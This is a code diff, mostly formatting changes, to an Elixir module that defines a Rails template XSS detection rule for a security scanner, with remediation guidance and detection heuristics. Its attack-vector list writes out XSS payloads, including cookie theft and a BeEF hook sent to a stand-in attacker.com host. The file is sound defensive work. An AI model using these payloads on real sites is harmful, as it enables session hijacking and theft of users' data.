@@ -1,37 +1,37 @@
 defmodule Rsolv.Security.Patterns.Rails.TemplateXss do
   @moduledoc """
   Rails Template XSS pattern for Rails applications.
-  
+
   This pattern detects Cross-Site Scripting (XSS) vulnerabilities in Rails 
   templates through unsafe output methods like raw(), html_safe(), and 
   unescaped ERB tags. XSS is one of the most common web application 
   vulnerabilities and can lead to account takeover, data theft, and malware distribution.
-  
+
   ## Background
-  
+
   Rails provides automatic HTML escaping by default in templates, but developers
   can bypass this protection using methods like raw(), html_safe(), or unescaped
   ERB tags (<%== %>). When user input is passed to these methods without proper
   sanitization, it creates XSS vulnerabilities.
-  
+
   ## Vulnerability Details
-  
+
   The vulnerability occurs when:
   1. User input is passed to raw() or html_safe() methods
   2. Unescaped ERB output tags (<%== %>) are used with user data
   3. Link helpers (link_to) use raw() or html_safe() on user input
   4. Content helpers (content_tag) bypass escaping with user data
   5. Haml templates use unescaped output (!= ) with user input
-  
+
   ## Known CVEs
-  
+
   - CVE-2015-3226: XSS in ActiveSupport JSON encoding (CVSS 6.1)
   - CVE-2013-4389: XSS in simple_format helper in ActionPack
   - CVE-2014-7829: XSS in Action View when certain data is passed to truncate
   - Multiple XSS vulnerabilities in Rails applications using raw/html_safe
-  
+
   ## Examples
-  
+
       # Critical - raw() with user input
       <%= raw params[:content] %>
       
@@ -50,9 +50,9 @@ defmodule Rsolv.Security.Patterns.Rails.TemplateXss do
       # Safe - sanitized content
       <%= sanitize(params[:content]) %>
   """
-  
+
   use Rsolv.Security.Patterns.PatternBase
-  
+
   def pattern do
     %Rsolv.Security.Pattern{
       id: "rails-template-xss",
@@ -113,7 +113,8 @@ defmodule Rsolv.Security.Patterns.Rails.TemplateXss do
       ],
       cwe_id: "CWE-79",
       owasp_category: "A03:2021",
-      recommendation: "Use Rails built-in escaping or sanitization helpers: sanitize(), strip_tags(), or h(). Remove raw() and html_safe() calls on user content.",
+      recommendation:
+        "Use Rails built-in escaping or sanitization helpers: sanitize(), strip_tags(), or h(). Remove raw() and html_safe() calls on user content.",
       test_cases: %{
         vulnerable: [
           "<%= raw params[:content] %>",
@@ -130,7 +131,7 @@ defmodule Rsolv.Security.Patterns.Rails.TemplateXss do
       }
     }
   end
-  
+
   def vulnerability_metadata do
     %{
       description: """
@@ -140,7 +141,7 @@ defmodule Rsolv.Security.Patterns.Rails.TemplateXss do
       escaping by default, developers can bypass this protection using methods like 
       raw(), html_safe(), or unescaped ERB output tags, creating XSS vulnerabilities 
       when user input reaches these methods.
-      
+
       The vulnerability is particularly dangerous because:
       1. It can execute arbitrary JavaScript in users' browsers
       2. It can steal session cookies and authentication tokens
@@ -148,7 +149,6 @@ defmodule Rsolv.Security.Patterns.Rails.TemplateXss do
       4. It can redirect users to malicious websites
       5. It's often overlooked due to Rails' default escaping giving a false sense of security
       """,
-      
       attack_vectors: """
       1. **Script Injection**: <script>alert('XSS')</script>
       2. **Cookie Theft**: <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
@@ -161,7 +161,6 @@ defmodule Rsolv.Security.Patterns.Rails.TemplateXss do
       9. **CSS Injection**: <style>body{background:url('http://attacker.com/steal.php?data='+document.cookie)}</style>
       10. **BeEF Hook**: <script src="http://attacker.com:3000/hook.js"></script>
       """,
-      
       business_impact: """
       - Account takeover through session/cookie theft
       - Financial fraud through unauthorized transactions
@@ -174,7 +173,6 @@ defmodule Rsolv.Security.Patterns.Rails.TemplateXss do
       - Defacement of website content
       - Compliance violations (PCI DSS, SOX, HIPAA)
       """,
-      
       technical_impact: """
       - Complete compromise of user sessions
       - Theft of authentication cookies and tokens
@@ -187,9 +185,8 @@ defmodule Rsolv.Security.Patterns.Rails.TemplateXss do
       - Social engineering and phishing attacks
       - Persistent XSS creating ongoing compromise
       """,
-      
-      likelihood: "High - XSS is very common due to frequent use of user input in templates and bypassing of Rails' default protections",
-      
+      likelihood:
+        "High - XSS is very common due to frequent use of user input in templates and bypassing of Rails' default protections",
       cve_examples: [
         "CVE-2015-3226 - XSS in ActiveSupport JSON encoding affecting Rails 3.x, 4.1.x, 4.2.x (CVSS 6.1)",
         "CVE-2013-4389 - Format string vulnerabilities in Action Mailer log subscriber (related to output handling)",
@@ -199,7 +196,6 @@ defmodule Rsolv.Security.Patterns.Rails.TemplateXss do
         "CVE-2009-4214 - XSS in escape_once helper",
         "HackerOne Report #755354 - XSS in link_to helper when passing parameters directly"
       ],
-      
       compliance_standards: [
         "OWASP Top 10 2021 - A03: Injection",
         "CWE-79: Cross-site Scripting (XSS)",
@@ -210,7 +206,6 @@ defmodule Rsolv.Security.Patterns.Rails.TemplateXss do
         "ASVS 4.0 - V5.3 Output Encoding and Injection Prevention",
         "SANS Top 25 - CWE-79 Cross-site Scripting"
       ],
-      
       remediation_steps: """
       1. **Remove Unsafe Methods (Critical)**:
          ```ruby
@@ -222,7 +217,7 @@ defmodule Rsolv.Security.Patterns.Rails.TemplateXss do
          # Always use Rails' default escaping
          <%= params[:content] %>                 # SAFE - Auto-escaped
          ```
-      
+
       2. **Use Sanitization Helpers**:
          ```ruby
          # For user content that may contain HTML
@@ -233,7 +228,7 @@ defmodule Rsolv.Security.Patterns.Rails.TemplateXss do
          <%= strip_tags(params[:content]) %>     # Remove all HTML
          <%= h(params[:content]) %>              # Explicit HTML escaping
          ```
-      
+
       3. **Secure Link Generation**:
          ```ruby
          # Bad - Direct user input in href
@@ -251,7 +246,7 @@ defmodule Rsolv.Security.Patterns.Rails.TemplateXss do
          
          <%= link_to "Visit", safe_url(@user.website) if safe_url(@user.website) %>
          ```
-      
+
       4. **Content Security Policy (Defense in Depth)**:
          ```ruby
          # In ApplicationController
@@ -264,7 +259,7 @@ defmodule Rsolv.Security.Patterns.Rails.TemplateXss do
              "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'"
          end
          ```
-      
+
       5. **Input Validation at Model Level**:
          ```ruby
          class User < ApplicationRecord
@@ -280,7 +275,6 @@ defmodule Rsolv.Security.Patterns.Rails.TemplateXss do
          end
          ```
       """,
-      
       prevention_tips: """
       - Never use raw(), html_safe(), or <%== %> with user input
       - Always rely on Rails' default HTML escape mechanisms for user content
@@ -295,7 +289,6 @@ defmodule Rsolv.Security.Patterns.Rails.TemplateXss do
       - Perform regular penetration testing focusing on XSS
       - Implement automated security scanning in development
       """,
-      
       detection_methods: """
       - Static analysis with Brakeman scanner (detects most XSS patterns)
       - Manual code review focusing on raw(), html_safe(), <%== %> usage
@@ -308,11 +301,10 @@ defmodule Rsolv.Security.Patterns.Rails.TemplateXss do
       - Runtime application security (RASP) solutions
       - Security-focused linters and IDE plugins
       """,
-      
       safe_alternatives: """
       # 1. Use Rails' default HTML escaping (Recommended)
       <%= params[:content] %>  # Automatically escaped and safe
-      
+
       # 2. Explicit sanitization for rich content
       class ApplicationHelper
         def safe_user_content(content)
@@ -320,16 +312,16 @@ defmodule Rsolv.Security.Patterns.Rails.TemplateXss do
                    attributes: %w[href])
         end
       end
-      
+
       # In view
       <%= safe_user_content(@post.content) %>
-      
+
       # 3. Strip all HTML for plain text
       <%= strip_tags(params[:content]) %>
-      
+
       # 4. Explicit HTML escaping
       <%= h(params[:content]) %>  # Same as default, but explicit
-      
+
       # 5. Safe URL handling
       class UrlValidator
         ALLOWED_SCHEMES = %w[http https].freeze
@@ -342,21 +334,21 @@ defmodule Rsolv.Security.Patterns.Rails.TemplateXss do
           false
         end
       end
-      
+
       # In view
       <% if UrlValidator.safe_url?(@user.website) %>
         <%= link_to "Website", @user.website, target: "_blank", rel: "noopener" %>
       <% end %>
-      
+
       # 6. Content helper with automatic escaping
       <%= content_tag :div, params[:content], class: "user-content" %>
-      
+
       # 7. Safe form helpers (automatically escaped)
       <%= form_with model: @user do |f| %>
         <%= f.text_field :name %>  # Input automatically escaped
         <%= f.text_area :bio %>    # Output automatically escaped
       <% end %>
-      
+
       # 8. Custom sanitizer with strict whitelist
       class StrictSanitizer
         include ActionView::Helpers::SanitizeHelper
@@ -372,46 +364,67 @@ defmodule Rsolv.Security.Patterns.Rails.TemplateXss do
           )
         end
       end
-      
+
       # Usage
       <%= StrictSanitizer.clean(params[:content]) %>
       """
     }
   end
-  
+
   def ast_enhancement do
     %{
       min_confidence: 0.7,
-      
       context_rules: %{
         # Dangerous output methods that bypass escaping
         dangerous_methods: [
-          "raw", "html_safe", "content_tag", "link_to", "button_to",
-          "concat", "render", "form_tag"
+          "raw",
+          "html_safe",
+          "content_tag",
+          "link_to",
+          "button_to",
+          "concat",
+          "render",
+          "form_tag"
         ],
-        
+
         # Common sources of user input
         user_input_sources: [
-          "params", "request", "cookies", "session",
-          "query_params", "form_params", "user_input", "@user", "@post"
+          "params",
+          "request",
+          "cookies",
+          "session",
+          "query_params",
+          "form_params",
+          "user_input",
+          "@user",
+          "@post"
         ],
-        
+
         # Template patterns that are dangerous
         dangerous_erb_patterns: [
-          "<%==", "raw(", ".html_safe", "!=", "link_to"
+          "<%==",
+          "raw(",
+          ".html_safe",
+          "!=",
+          "link_to"
         ],
-        
+
         # Safe patterns to reduce false positives
         safe_patterns: [
-          ~r/sanitize\s*\(/,                # Using sanitize helper
-          ~r/strip_tags\s*\(/,             # Using strip_tags
-          ~r/h\s*\(/,                      # Using h() helper
-          ~r/escape_once\s*\(/,            # Using escape_once
-          ~r/raw\s*\(\s*[\"'][^\"']*[\"']\s*\)/,  # Static strings only
-          ~r/\.html_safe\s*$/              # html_safe on string literals
+          # Using sanitize helper
+          ~r/sanitize\s*\(/,
+          # Using strip_tags
+          ~r/strip_tags\s*\(/,
+          # Using h() helper
+          ~r/h\s*\(/,
+          # Using escape_once
+          ~r/escape_once\s*\(/,
+          # Static strings only
+          ~r/raw\s*\(\s*[\"'][^\"']*[\"']\s*\)/,
+          # html_safe on string literals
+          ~r/\.html_safe\s*$/
         ]
       },
-      
       confidence_rules: %{
         adjustments: %{
           # Very high confidence for raw/html_safe with user input
@@ -432,7 +445,6 @@ defmodule Rsolv.Security.Patterns.Rails.TemplateXss do
           haml_unescaped_output: +0.3
         }
       },
-      
       ast_rules: %{
         # Template output analysis
         output_analysis: %{
@@ -441,7 +453,7 @@ defmodule Rsolv.Security.Patterns.Rails.TemplateXss do
           track_method_calls: true,
           dangerous_methods: ["raw", "html_safe"]
         },
-        
+
         # Method call context analysis
         method_analysis: %{
           check_receiver: true,
@@ -449,14 +461,14 @@ defmodule Rsolv.Security.Patterns.Rails.TemplateXss do
           trace_user_input: true,
           dangerous_method_patterns: ["raw", "html_safe", "content_tag", "link_to"]
         },
-        
+
         # Variable flow tracking
         variable_flow: %{
           track_assignments: true,
           check_method_chains: true,
           detect_user_input_flow: true
         },
-        
+
         # Safety pattern detection
         safety_detection: %{
           sanitization_methods: ["sanitize", "strip_tags", "h", "escape_once"],
@@ -466,6 +478,4 @@ defmodule Rsolv.Security.Patterns.Rails.TemplateXss do
       }
     }
   end
-  
 end
-
